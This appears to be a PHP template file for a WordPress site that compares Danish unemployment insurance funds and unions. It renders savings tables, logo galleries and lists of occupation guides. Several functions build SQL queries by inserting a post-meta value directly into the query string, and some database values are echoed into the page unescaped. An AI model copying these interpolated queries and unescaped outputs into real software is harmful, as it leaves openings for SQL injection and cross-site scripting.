<td  class="tabel-center-middel stack-small"><span style=font-size:11px;line-height:15px;display:block;padding-top:5px;padding-bottom:5px;">Ingen<br/>besparelse</span></td>
<?php } elseif($fagforening_pris==0 && $valgt_akasse_pris_mdr<=$pris_mdr) { //  fagforening: ikke mulig + a-kasse: ingen besparelse  ?>
<td  class="tabel-center-middel stack-small"><span style=font-size:11px;line-height:15px;display:block;padding-top:5px;padding-bottom:5px;">Ingen<br/>besparelse</span></td>
<?php } elseif($valgt_akasse_fag_pris_mdr>$fagforening_pris && $valgt_akasse_pris_mdr>$pris_mdr && $fagforening_pris>0) { // a-kasse: besparelse + fagforening: besparelse ?>
<td  class="tabel-center-middel stack-small"><b><?php echo $saved_year_total_display; ?></b><span class="denotion"> kr.</span><span class="specs">Total / år <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-html="true" data-toggle="tooltip" title="" data-original-title="<strong><?php echo $valgt_akasse_display; ?></strong>: (<?php echo $valgt_akasse_pris_mdr; ?>+<?php echo $valgt_akasse_fag_pris_mdr; ?><?php if ($valgt_akasse_samlerabat_mdr > 0) { ?>-<?php echo $valgt_akasse_samlerabat_mdr; ?><?php } ?>) x 12<span class='right'><?php echo number_format(($valgt_akasse_pris_mdr+$valgt_akasse_fag_pris_mdr-$valgt_akasse_samlerabat_mdr)*12, 0, ',', '.'); ?></span><br/><strong><?php echo $udbyder_display; ?></strong>: (<?php echo $pris_mdr; ?>+<?php echo $fagforening_pris; ?>) x 12<span class='right'><?php echo number_format(($pris_mdr+$fagforening_pris)*12, 0, ',', '.'); ?></span><hr/>Skift a-kasse + fagforening og spar: <span class='right'><?php echo $saved_year_total_display; ?></span>"></span></span></td>
<?php } elseif($valgt_akasse_pris_mdr>$pris_mdr && $fagforening_pris==0 ) { // a-kasse: besparelse + fagforening: ikke mulig ?>
<td  class="tabel-center-middel stack-small">
<b><?php echo $saved_year; ?></b><span class="denotion"> kr.</span><span class="specs">Total / år <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-html="true" title="" data-original-title="<strong><?php echo $valgt_akasse_display; ?></strong>: <?php echo $valgt_akasse_pris_mdr; ?> x 12<span class='right'><?php echo number_format(12*$valgt_akasse_pris_mdr, 0, ',', '.'); ?></span><br/><strong><?php echo $udbyder_display; ?></strong>: <?php echo $pris_mdr; ?> x 12<span class='right'><?php echo number_format(12*$pris_mdr, 0, ',', '.'); ?></span><hr/>Skift a-kasse og spar: <span class='right'><?php echo $saved_year; ?></span>"></span></span>
</td>
<?php } elseif ($valgt_akasse_fag_pris_mdr>=$fagforening_pris && $valgt_akasse_pris_mdr<=$pris_mdr) {  // fagforening: besparelse + a-kasse: ingen besparelse  ?>
<td  class="tabel-center-middel stack-small"><b><?php echo $saved_year_fag_display; ?></b><span class="denotion"> kr.</span><span class="specs">Total / år <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-html="true" data-toggle="tooltip" title="" data-original-title="<strong><?php echo $valgt_akasse_display; ?></strong>: <?php echo $valgt_akasse_fag_pris_mdr; ?> x 12<span class='right'><?php echo number_format(($valgt_akasse_fag_pris_mdr)*12, 0, ',', '.'); ?></span><br/><strong><?php echo $udbyder_display; ?></strong>: <?php echo $fagforening_pris; ?> x 12<span class='right'><?php echo number_format(($fagforening_pris)*12, 0, ',', '.'); ?></span><hr/>Skift fagforening og spar: <span class='right'><?php echo $saved_year_fag_display; ?></span>"></span></span></td>
<?php } elseif ($valgt_akasse_fag_pris_mdr<=$fagforening_pris && $valgt_akasse_pris_mdr>$pris_mdr) { //  fagforening: ingen besparelse + a-kasse: besparelse ?>
<td  class="tabel-center-middel stack-small">
<b><?php echo $saved_year; ?></b><span class="denotion"> kr.</span><span class="specs">På a-kasse <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;"data-container="body" data-html="true" title="" data-original-title="<strong><?php echo $valgt_akasse_display; ?></strong>: <?php echo $valgt_akasse_pris_mdr; ?> x 12<span class='right'><?php echo number_format(12*$valgt_akasse_pris_mdr, 0, ',', '.'); ?></span><br/><strong><?php echo $udbyder_display; ?></strong>: <?php echo $pris_mdr; ?> x 12<span class='right'><?php echo number_format(12*$pris_mdr, 0, ',', '.'); ?></span><hr/>Skift a-kasse og spar: <span class='right'><?php echo $saved_year; ?></span>"></span></span>
</td>
<?php } ?>

<?php } ?>
<td  class="tabel-center-middel stack-small"><span class="btn btn-block btn-primary btn-success" style="font-weight:600;" onclick="go_udbyder('<?php echo $id; ?>');"><span class="glyphicon glyphicon-circle-arrow-right"></span> LÆS MERE</span><?php if($recomended>=1) {?><div class="course_ribbon_box"><span class="course_ribbon_box_text">Populært valg <span class="glyphicon glyphicon-star"></span></span></div> <?php }?></td>
</tr>
<?php
}
}
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<tr><td class="lastupdated" colspan="10" >Data senest opdateret: <?php echo $updated; ?></td></tr>
</tbody>
</table>
<?php } ?>
</div>
</div>
<?php
return ob_get_clean();
	 }
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'spar_test_wp', 'spar_test_wp' );
}

function udbyder_img_list($db) {
 ob_start();
    global $post;
    $myposts = get_posts( array(
        'category'       => 7,
		'posts_per_page' => 100,
    ) );
 ?>
 <div style="text-align:justify;">
 <?php
    if ( $myposts ) {
        foreach ( $myposts as $post ) :
            setup_postdata( $post );
			$preselected = get_post_meta( get_the_ID(), 'preselected', true );
			global $db;
			$get_list = "SELECT * FROM data WHERE udbyder='$preselected'";
			$result_list = $db->query($get_list);

			while ($row_list = mysqli_fetch_array($result_list)) {
				$aktiv = $row_list["ACTIVE"];
				$affiliate_url = $row_list["AFFILIATE_URL"];
				$pris_mdr = $row_list["PRIS_MDR"];
				$tp = $row_list["TRUSTPILOT_SCORE"];
				$udbyder = $row_list["UDBYDER"];
				$medlemmer = $row_list["MEDLEMMER"];
				$optagelse = $row_list["OPTAGELSE"];
				$logo = $row_list["logo"];
				$recomended = $row_list["recomended"];
			}
			if (!empty($logo)){
			?>
            <a href="<?php the_permalink(); ?>" style="text-align:center;display:inline;"><img src="<?php echo $logo; ?>" alt="<?php the_title(); ?>" class="logo-gallery" width="135" /></a>
        <?php
		    }
        endforeach;
        wp_reset_postdata();
	}
    ?>
    </div>
    <div style="clear:both"></div>
<?php
return ob_get_clean();
}
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'udbyder_img_list', 'udbyder_img_list' );
}

function udmeldelse_list($db) {
 ob_start();
    global $post;
    $myposts = get_posts( array(
        'category'       => 9,
		'posts_per_page' => 100,
    ) );
 ?>
 <ul>
 <?php
    if ( $myposts ) {
        foreach ( $myposts as $post ) :
            setup_postdata( $post );
			$preselected = get_post_meta( get_the_ID(), 'preselected', true );
			global $db;
			$get_list = "SELECT * FROM data WHERE udbyder='$preselected'";
			$result_list = $db->query($get_list);
			while ($row_list = mysqli_fetch_array($result_list)) {
				$udbyder_display = $row_list["udbyder_display"];
				$logo = $row_list["logo"];
			}
			if (!empty($logo)){
			?>
            <li><a href="<?php the_permalink(); ?>" >Udmeldelse af <?php echo $udbyder_display; ?></a></li>
        <?php
		    }
        endforeach;
        wp_reset_postdata();
	}
    ?>
</ul>
<?php
return ob_get_clean();
}
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'udmeldelse_list', 'udmeldelse_list' );
}



function fagforening_jobs($db) {
 ob_start();
    global $post;
    $myposts = get_posts( array(
        'category'       => 10,
		'posts_per_page' => 100,
		'orderby' => 'meta_value',
		'meta_key' => 'fag_for_order',
		'order' => 'ASC'
    ) );
 ?>
 <script>
jQuery(document).ready(function($){
		$('#more_button').click(function(){
		$('.course-height-limit').css("height","100%");
		$('#more_button').hide();
		});
});
   jQuery(document).ready(function() {
      jQuery('.glyphicon-info-sign').click(function() {
          if (jQuery(this).closest('.job').is('.open')){
              jQuery(this).closest('.job').find('.job_desc').animate({'height':'0'},200);
              jQuery(this).closest('.job').removeClass('open');
              }else{
                  var newHeight =jQuery(this).closest('.job').find('.job_desc_text').height() +'px';
                  jQuery(this).closest('.job').find('.job_desc').animate({'height':newHeight},200);
                  jQuery(this).closest('.job').addClass('open');
              }
      });
  });
</script>

 <style>
	#more_button {
		position: absolute;
		z-index: 1000;
		padding: 40px;
		bottom: 0;
		left: 0;
		display: block;
		cursor: pointer;
		width: 100%;
		height: 115px;
		background: linear-gradient(to bottom,rgba(255,255,255,0) 0%,#f5f5f5 60%,#f5f5f5 32%,#f5f5f5 100%);
		background: -webkit-linear-gradient(top,rgba(255,255,255,0) 0%,#f5f5f5 60%,#f5f5f5 32%,#f5f5f5 100%);
		background: -moz-linear-gradient(top,rgba(255,255,255,0) 0%,rgba(245,245,245) 60%,rgba(245,245,245) 32%,rgba(245,245,245) 100%);
		filter: progid: DXImageTransform.Microsoft.gradient(startColorstr='#f5f5f5',endColorstr='#f5f5f5',GradientType=0);
		text-align: center;
		font-size: 20px;
		font-weight:600;
		text-decoration: none;
		color: #666;
	}
	.course-height-limit {
		height: 550px;
		overflow: hidden;
		position: relative;
		max-width: 1100px;
	}
	.job_desc {
	height: 0;
	overflow: hidden;
	padding: 0;
	font-size: 16px;
	}
	.glyphicon-info-sign {
	cursor:pointer;
	color:#999999;
	font-size:13px;
	}
	.job_desc_text {
	font-size:14px;
	max-width:300px;
	}
 </style>
 <div class="course-height-limit">
  <span id="more_button">SE FLERE <span class="glyphicon glyphicon-chevron-down"></span></span>
 <?php
    if ( $myposts ) {
    $x = 0;
    $groups = Array();
      foreach ( $myposts as $post ) {
      $post_id = get_the_ID();
      $list_title = get_post_meta($post_id , 'fag_for_order', true);
			$firstLetter = substr($list_title, 0, 1);
      if( array_key_exists($firstLetter, $groups))
          array_push($groups[$firstLetter], $post_id);
      else {
          $groups[$firstLetter] = Array($post_id);
      }
      }
        $count = 1;
        foreach($groups as $key => $value ) {
            if ($count%2 == 1) {
                 echo "<div style='display:flex;margin-bottom: 10px;'>";
            }
            ?>
            <div style="display:inline-block;width:250px;float:left;flex:1;">
                <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong><?php echo strtoupper($key) ?></strong></p>
                <?php foreach($value as $post_id) {
                  $yoast_title = get_post_meta($post_id, '_yoast_wpseo_title', true);
				  $yoast_desc = get_post_meta($post_id, '_yoast_wpseo_metadesc', true);
            			$list_title = get_post_meta($post_id, 'fag_for_order', true);
                  ?>
                  <div class="job">
                 <p style="margin-bottom:0px"><a href="<?php the_permalink($post_id); ?>" title="<?php echo $yoast_title; ?>" ><?php echo $list_title; ?></a> <span class="glyphicon glyphicon-info-sign"></span></p>
                 <div class="job_desc" style="height:0px;">
                <p class="job_desc_text"><?php echo $yoast_desc; ?></p>
                </div>
                 </div>
                <?php } ?>
            </div>
            <?php
            if ($count%2 == 0) {
                echo "</div>";
            }
            $count++;
        }
        if ($count%2 != 1) echo "</div>";
        wp_reset_postdata();
	  }
    ?>
    </div>
<?php
return ob_get_clean();
}
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'fagforening_jobs', 'fagforening_jobs' );
}



function akasse_jobs($db) {
 ob_start();
 ?>
  <script>
jQuery(document).ready(function($){
		$('#more_button').click(function(){
		$('.course-height-limit').css("height","100%");
		$('#more_button').hide();
		});
});
   jQuery(document).ready(function() {
      jQuery('.glyphicon-info-sign').click(function() {
          if (jQuery(this).closest('.job').is('.open')){
              jQuery(this).closest('.job').find('.job_desc').animate({'height':'0'},200);
              jQuery(this).closest('.job').removeClass('open');
              }else{
                  var newHeight =jQuery(this).closest('.job').find('.job_desc_text').height() +'px';
                  jQuery(this).closest('.job').find('.job_desc').animate({'height':newHeight},200);
                  jQuery(this).closest('.job').addClass('open');
              }
      });
  });
</script>
 <style>
	#more_button {
		position: absolute;
		z-index: 1000;
		padding: 40px;
		bottom: 0;
		left: 0;
		display: block;
		cursor: pointer;
		width: 100%;
		height: 115px;
		background: linear-gradient(to bottom,rgba(255,255,255,0) 0%,#f5f5f5 60%,#f5f5f5 32%,#f5f5f5 100%);
		background: -webkit-linear-gradient(top,rgba(255,255,255,0) 0%,#f5f5f5 60%,#f5f5f5 32%,#f5f5f5 100%);
		background: -moz-linear-gradient(top,rgba(255,255,255,0) 0%,rgba(245,245,245) 60%,rgba(245,245,245) 32%,rgba(245,245,245) 100%);
		filter: progid: DXImageTransform.Microsoft.gradient(startColorstr='#f5f5f5',endColorstr='#f5f5f5',GradientType=0);
		text-align: center;
		font-size: 20px;
		font-weight:600;
		text-decoration: none;
		color: #666;
	}
	.course-height-limit {
		height: 550px;
		overflow: hidden;
		position: relative;
		max-width: 1100px;
	}
  .job_desc {
    height: 0;
    overflow: hidden;
    padding: 0;
    font-size: 16px;
  }
 .glyphicon-info-sign {
	 cursor:pointer;
	 color:#999999;
	 font-size:13px;
 }
 .job_desc_text {
	 font-size:14px;
	 max-width:300px;
}
 </style>
 <div class="course-height-limit">
  <span id="more_button">SE FLERE <span class="glyphicon glyphicon-chevron-down"></span></span>
      <div style="display:flex;margin-bottom: 10px;">
        <div style="display:inline-block;width:250px;float:left;flex:1;">
        <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>A</strong></p>
              <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-arkitekter/" title="A-kasse for arkitekter">Arkitekter</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">Vi skal i denne guide kigge på a-kasser for arkitekter og arkitektstuderende. Vi ser på de klassiske valg samt, hvor du pt. får den billigste a-kasse.</p>
                </div>
     	      </div>
        </div>
        <div style="display:inline-block;width:250px;float:left;flex:1;">
           <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>B</strong></p>
            <div class="job">
              <p style="margin-bottom:0px"><a href="/blog/a-kasse-for-butiksansatte.php" title="A-kasse for Butiksansatte">Butiksansatte</a> <span class="glyphicon glyphicon-info-sign"></span></p>
              <div class="job_desc" style="height: 0px;">
              <p class="job_desc_text">Arbejder du i butik, så har du lige som alle andre lønmodtagere brug for en god a-kasse. Se her hvilke a-kasser for butiksansatte der findes og hvem du bør vælge!</p>
              </div>
          </div>
          <div class="job">
              <p style="margin-bottom:0px"><a href="/wp/a-kasser-byggeri-anlaeg/" title="A-kasse for Byggeri & Anlæg">Byggeri & Anlæg</a> <span class="glyphicon glyphicon-info-sign"></span></p>
              <div class="job_desc" style="height: 0px;">
              <p class="job_desc_text">Arbejder du indenfor byggeri & anlæg, og leder du efter en god a-kasse? Her giver vi dig de bedste og billigste a-kasser.</p>
              </div>
          </div>
            <div class="job">
              <p style="margin-bottom:0px"><a href="/wp/a-kasse-biologer/" title="A-kasse for biologer">Biologer</a> <span class="glyphicon glyphicon-info-sign"></span></p>
              <div class="job_desc" style="height: 0px;">
              <p class="job_desc_text">Vi skal i denne guide se på a-kasser for biologer. Som biolog har du nemlig mange muligheder, og vi kigger på de bedste og billigste lige nu!</p>
              </div>
          </div>
             <div class="job">
              <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-bioanalytikere/" title="A-kasse for Bioanalytikere">Bioanalytikere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
              <div class="job_desc" style="height: 0px;">
              <p class="job_desc_text">Er du ansat som bioaanalytiker findes der masser af muligheder for a-kasser, både fagspecifikke og tværfaglige. Her giver vi dig det komplette overblik!</p>
              </div>
          </div>
             <div class="job">
              <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-bankansatte/" title="A-kasse for Bankansatte">Bankansatte</a> <span class="glyphicon glyphicon-info-sign"></span></p>
              <div class="job_desc" style="height: 0px;">
              <p class="job_desc_text">Har du et arbejde i en bank, altså bankansat, så findes mange muligheder, både for tværfaglige a-kasser, men også a-kasser specifikt til din faggruppe.</p>
              </div>
          </div>
             <div class="job">
              <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-bagere/" title="A-kasse for Bagere">Bagere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
              <div class="job_desc" style="height: 0px;">
              <p class="job_desc_text">I denne artikel kigger vi nærmere på a-kasser for bagere. Vi ser på hvor du finder den bedste og billigste a-kasse for bagere.</p>
              </div>
          </div>
           <div class="job">
              <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-bibliotekarer/" title="A-kasse for Bibliotekarer">Bibliotekarer</a> <span class="glyphicon glyphicon-info-sign"></span></p>
              <div class="job_desc" style="height: 0px;">
              <p class="job_desc_text">I denne guide ser vi nærmere på a-kasser for bibliotekarer. Vi se på de traditionelle valg samt hvor du potentielt kan spare penge ved at melde dig ind.</p>
              </div>
          </div>
          <div class="job">
              <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-bedemaend/" title="A-kasse for Bedemænd">Bedemænd</a> <span class="glyphicon glyphicon-info-sign"></span></p>
              <div class="job_desc" style="height: 0px;">
              <p class="job_desc_text">I denne guide vil du se, hvilket muligheder du har for a-kasse som bedemand. Find de billigste og bedste muligheder.</p>
              </div>
          </div>
          <div class="job">
              <p style="margin-bottom:0px"><a href="/wp/a-kasse-bygningskonstruktoer/" title="A-kasse for Bygningskonstruktører">Bygningskonstruktør</a> <span class="glyphicon glyphicon-info-sign"></span></p>
              <div class="job_desc" style="height: 0px;">
              <p class="job_desc_text">I denne guide ser vi nærmere på a-kasse for bygningskonstruktører. Vi har fundet de billigste og bedste muligheder lige nu.</p>
              </div>
          </div>
        </div>
      </div>
      <div style="display:flex;margin-bottom: 10px;">
           <div style="display:inline-block;width:250px;float:left;flex:1;">
                  <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>C</strong></p><div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-chauffoerer/" title="A-kasse for Chauffører">Chauffører</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">Er du taxachauffør, lastbilchauffør, buschauffør eller måske en anden form for chauffør, så hat vi på her fundet de bedste og billige a-kasser til dig!</p>
                </div>
     	      </div>
              <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-callcenter-medarbejdere/" title="A-kasse for Callcenter-medarbejder">Callcenter-medarbejder</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">I denne guide kigger vi nærmere på, hos hvilke a-kasser du som callcenter medarbejder kan melde dig ind. Læs med og blive klogere.</p>
                </div>
     	      </div>
            </div>
            <div style="display:inline-block;width:250px;float:left;flex:1;">
               <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>D</strong></p>
                <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-dagplejere/" title="A-kasse for Dagplejere">Dagplejere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">I denne guide kigger vi på a-kasser for dagplejere. VI ser på hvor du som dagplejer finder den bedste og billigste a-kasse.</p>
                  </div>
              </div>
                 <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-dyrlaeger/" title="A-kasse for Dyrlæger">Dyrlæger</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">I denne guide kigger vi nærmere på a-kasser for dyrlæger. Vi se hvem du kan vælge og hvor du finder den bedste og billigste løsning.</p>
                  </div>
              </div>
            <div class="job">
              <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-designere/" title="A-kasse for designere">Designere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
              <div class="job_desc" style="height: 0px;">
              <p class="job_desc_text">Vi kigger i denne guide på de bedste og billigste a-kasser for designere. Får hjælp til at vælge a-kasse, hvis du arbejder som designer.</p>
              </div>
          </div>
            </div>
       </div>
       <div style="display:flex;margin-bottom: 10px;">
           <div style="display:inline-block;width:250px;float:left;flex:1;">
                   <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>E</strong></p>
             <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-ernaerings-og-sundhedskonsulenter/" title="A-kasse for ernærings- og sundhedskonsulenter">Ernærings- og sundhedskonsulenter</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">I denne artikel ser vi på a-kasser for ernærings- og sundhedskonsulenter. Vi ser på, hvor du får den billigste a-kasse lige.</p>
                </div>
     	      </div>
             <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-elektrikere/" title="A-kasse for Elektrikere">Elektrikere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">I denne artikel ser vi på a-kasser til elektrikere. Vi ser på hvor du kan melde dig ind, og hvor du finder den bedste / billigste løsning til din faggruppe.</p>
                </div>
     	      </div>
             <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-og-fagforening-for-ejendomsmaeglere/" title="A-kasse for Ejendomsmaeglere">Ejendomsmaegler</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">Vi skal i denne artikel se på de mulighedern du har for a-kasse og fagforening, hvis arbejder som ejendomsmægler. Læs med og bliv klogere!</p>
                </div>
     	      </div>
            <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-ernaeringsassistenter/" title="A-kasse for ernæringsassistenter">Ernæringsassistenter</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Vi skal i denne guide se på a-kasse for ernæringsassistenter. Se hvem Kost og Ernæringsforbundet anbefaler samt alternativer hertil</p>
                  </div>
            </div>
            <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-ergoterapeuter/" title="A-kasse for ernæringsassistenter">Ergoterapeuter</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Vi kigger her på a-kasse for ergoterapeuter. Hvad skal man vælge og hvilke muligheder er der for ergoterapeut studerende?</p>
                  </div>
            </div>
            </div>
            <div style="display:inline-block;width:250px;float:left;flex:1;">
               <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>F</strong></p>
                <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-frisoerer-kosmetik/" title="A-kasse for Frisører">Frisører</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Er du frisør har du brug for en a-kasse lige som alle andre. Se her hvem du kan og bør vælge blandt a-kasser for frisører!</p>
                  </div>
              </div>
              <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-landmaend-og-fiskere/" title="A-kasse for Fiskere">Fiskere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Er du landmand eller fisker er der lidt forskellige muligheder for a-kasse. Det afhænger blandt andet af om du er selvstændig eller ansat på en gård.</p>
                  </div>
              </div>
              <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-fysioterapeuter/" title="A-kasse for fysioterapeuter">Fysioterapeut</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Vi skal i denne guide kigge nærmere på a-kasse for fysioterapeuter. Vi skal på både de klassiske valg samt de billigste.</p>
                  </div>
              </div>
            </div>
       </div>
       <div style="display:flex;margin-bottom: 10px;">
           <div style="display:inline-block;width:250px;float:left;flex:1;">
                   <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>G</strong></p>
              <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-gymnasielaererne/" title="A-kasse for Gymnasielærerne">Gymnasielærerne</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">Er du ansat som gymnasielærer, så findes der rigtig mange muligheder for a-kasse medlemskab. I denne artikel har vi kigget på de bedste og billigste.</p>
                </div>
     	      </div>
              <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-gartnere/" title="A-kasse for Gartnere">Gartnere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">I denne artikel kigger vi nærmere på a-kasser for gartnere. VI kigger på de oplagte valg samt hvor du kan spare en masse penge ved at melde dig ind.</p>
                </div>
     	      </div>
             <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-grafikere/" title="A-kasse for Grafikere">Grafikere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">I denne danske guide kigger vi nærmere på a-kasser for grafikere. Vi ser på de oplagte muligheder samt de billigste a-kasser for grafikere.</p>
                </div>
     	      </div>
            </div>
            <div style="display:inline-block;width:250px;float:left;flex:1;">
               <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>H</strong></p>
               <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-hjemmehjaelpere/" title="A-kasse for Hjemmehjælpere">Hjemmehjælpere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Er du ansat som hjemmehjælper, og har du brug for en god og billig a-kasse? Så læs med her, hvor vi ser på a-kasser for hjemmehjælpere.</p>
                  </div>
              </div>
                <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-handicaphjaelpere/" title="A-kasse for Handicaphjælpere">Handicaphjælpere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">I denne artikel finder du råd og vejledning til valg af a-kasse for handicaphjælpere. Se hvem der er billigst og hvor du får den bedste rådgivning.</p>
                  </div>
              </div>
            <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-humanister/" title="A-kasse for humanister">Humanister</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Vi skal i denne artikel se på, hvilke a-kasser og fagforeninger, der findes for humanister. Læs med og bliv kolgere på de mange muligheder du har.</p>
                  </div>
              </div>
           <div class="job">
              <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-hr-assistenter-og-hr-konsulenter/" title="A-kasse for HR-ansat">HR-ansatte</a> <span class="glyphicon glyphicon-info-sign"></span></p>
              <div class="job_desc" style="height: 0px;">
              <p class="job_desc_text">Vi skal i denne guide se på a-kasser for HR-assistenter og HR-konsulenter. Vi ser på hvad man kan vælge, og hvem der er billigst</p>
              </div>
          </div>
         <div class="job">
              <p style="margin-bottom:0px"><a href="/wp/haandvaerkere-a-kasser/" title="Håndværker a-kasse">Håndværkere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
              <div class="job_desc" style="height: 0px;">
              <p class="job_desc_text">Arbejder du som håndværker og leder du efter en god a-kasse? Læs med her, hvor vi giver dig de bedste og billigste.</p>
              </div>
          </div>
        </div>
       </div>
       <div style="display:flex;margin-bottom: 10px;">
           <div style="display:inline-block;width:250px;float:left;flex:1;">
                   <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>I</strong></p>
               <div class="job">
                <p style="margin-bottom:0px"><a href="/blog/a-kasse-for-ingenioerer.php" title="A-kasse for Ingeniører">Ingeniører</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">Ingeniører har brug for en a-kasse lige som alle andre. Derfor har vi her lavet en komplet oversigt med a-kasser for ingeniører.</p>
                </div>
     	      </div>
               <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-indkoebere/" title="A-kasse for Indkøbere">Indkøbere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">Vi skal i denne guide se på a-kasser for indkøbere. Vi ser på, hvilken a-kasse du bør vælge, hvis du arbejder som indkøber.</p>
                </div>
     	      </div>
             <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/industri-a-kasser/" title="A-kasse for ansatte i industrien">Industri-ansat</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">Arbejder du i industrien og leder du efter en god a-kasse? Her giver vi de bedste og billigste a-kasser til dig der arbejder med industri</p>
                </div>
     	      </div>
            <div class="job">
               <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-ivaerksaettere/" title="A-kasse for iværksættere">Iværksætter</a> <span class="glyphicon glyphicon-info-sign"></span></p>
               <div class="job_desc" style="height: 0px;">
               <p class="job_desc_text">Vi skal i denne guide kigge nærmere på a-kasse for iværksættere. Vi skal på både de klassiske valg samt de billigste.</p>
               </div>
           </div>
            </div>
            <div style="display:inline-block;width:250px;float:left;flex:1;">
               <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>J</strong></p>
                <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-jurister/" title="A-kasse for Jurister">Jurister</a> <span class="glyphicon glyphicon-info-sign"></span></p>
